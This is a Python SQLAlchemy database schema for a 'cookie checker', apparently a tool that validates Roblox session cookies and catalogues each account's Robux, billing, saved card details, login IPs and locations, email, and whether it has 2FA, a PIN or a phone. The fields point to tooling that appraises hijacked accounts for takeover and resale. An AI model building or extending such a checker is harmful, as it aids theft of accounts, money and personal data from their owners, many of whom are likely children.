from __future__ import annotations

from datetime import datetime
from typing import TYPE_CHECKING, Any

from sqlalchemy import ForeignKey, BigInteger, Boolean, Integer, JSON, String, Text, DateTime
from sqlalchemy.orm import Mapped, mapped_column, relationship

from src.db.models import BaseModel, RunModel, ResultModel


if TYPE_CHECKING:
    from src.db.models import (
        RobloxAccount, BadgeOwned, GamepassOwned,
        ProductOwned, PlaceFavorited, PlacePlayed,
        BundleOwned, GroupOwned, PlaceOwned,
        RobloxBadgeOwned,
    )


class CookieCheckerRun(RunModel):
    __tablename__ = "runs"


class Card(BaseModel):
    __tablename__ = "cards"

    result_id: Mapped[int] = mapped_column(ForeignKey("results.id"), index=True)
    
    network: Mapped[str | None] = mapped_column(String(128))
    last_4_digits: Mapped[int | None] = mapped_column(Integer)
    expire_month: Mapped[int | None] = mapped_column(Integer)
    exprie_year: Mapped[int | None] = mapped_column(Integer)
    last_used: Mapped[int | None] = mapped_column(BigInteger)
    
    result: Mapped["CookieCheckerResult"] = relationship(back_populates="card")


class Session(BaseModel):
    __tablename__ = "sessions"

    result_id: Mapped[int] = mapped_column(ForeignKey("results.id"), index=True)
    
    city: Mapped[str | None] = mapped_column(String(128))
    subdivision: Mapped[str | None] = mapped_column(String(128))
    country: Mapped[str | None] = mapped_column(String(128))
    last_ip: Mapped[str | None] = mapped_column(String(128))
    is_trusted: Mapped[bool | None] = mapped_column(Boolean)
    
    result: Mapped["CookieCheckerResult"] = relationship(back_populates="sessions")


class Email(BaseModel):
    __tablename__ = "emails"

    result_id: Mapped[int] = mapped_column(ForeignKey("results.id"), unique=True, index=True)
    
    email: Mapped[str] = mapped_column(String(128))
    setted: Mapped[bool] = mapped_column(Boolean)
    verified: Mapped[bool] = mapped_column(Boolean)
    
    result: Mapped["CookieCheckerResult"] = relationship(back_populates="email")


class CookieCheckerResult(ResultModel):
    __tablename__ = "results"

    is_valid: Mapped[bool] = mapped_column(Boolean)
    
    user_id: Mapped[int | None] = mapped_column(ForeignKey("accounts.user_id"), index=True)
    account: Mapped["RobloxAccount"] = relationship()
    
    country_code: Mapped[str | None] = mapped_column(String(2))
    registration_date: Mapped[datetime | None] = mapped_column(DateTime)

    robux: Mapped[int | None] = mapped_column(BigInteger)
    billing: Mapped[int | None] = mapped_column(BigInteger)
    pending: Mapped[int | None] = mapped_column(BigInteger)
    donate_period: Mapped[str | None] = mapped_column(String(5))
    donate_period_amount: Mapped[int | None] = mapped_column(BigInteger)
    donate_all_time: Mapped[int | None] = mapped_column(BigInteger)
    rap: Mapped[int | None] = mapped_column(BigInteger)
    card: Mapped["Card | None"] = relationship(back_populates="result")
    premium: Mapped[bool | None] = mapped_column(Boolean)
    badges: Mapped[list["BadgeOwned"] | None] = relationship(back_populates="result")
    gamepasses: Mapped[list["GamepassOwned"] | None] = relationship(back_populates="result")
    products: Mapped[list["ProductOwned"] | None] = relationship(back_populates="result")
    places_favorited: Mapped[list["PlaceFavorited"] | None] = relationship(back_populates="result")
    places_played: Mapped[list["PlacePlayed"] | None] = relationship(back_populates="result")
    bundles: Mapped[list["BundleOwned"] | None] = relationship(back_populates="result")
    sessions: Mapped[list["Session"] | None] = relationship(back_populates="result")
    email: Mapped["Email | None"] = relationship(back_populates="result", uselist=False)
    has_phone: Mapped[bool | None] = mapped_column(Boolean)
    has_2fa: Mapped[bool | None] = mapped_column(Boolean)
    has_pin: Mapped[bool | None] = mapped_column(Boolean)
    groups_owned: Mapped[list["GroupOwned"] | None] = relationship(back_populates="result")
    places_owned: Mapped[list["PlaceOwned"] | None] = relationship(back_populates="result")
    age_group: Mapped[str | None] = mapped_column(String(3))
    is_verified_age: Mapped[bool | None] = mapped_column(Boolean)
    is_verified_voice: Mapped[bool | None] = mapped_column(Boolean)
    friends: Mapped[int | None] = mapped_column(Integer)
    followers: Mapped[int | None] = mapped_column(Integer)
    followings: Mapped[int | None] = mapped_column(Integer)
    roblox_badges: Mapped[list["RobloxBadgeOwned"] | None] = relationship(back_populates="result")
    
    payload: Mapped[dict[str, Any] | None] = mapped_column(JSON)
    
    cookie: Mapped[str] = mapped_column(Text)


__all__ = ("CookieCheckerResult",)
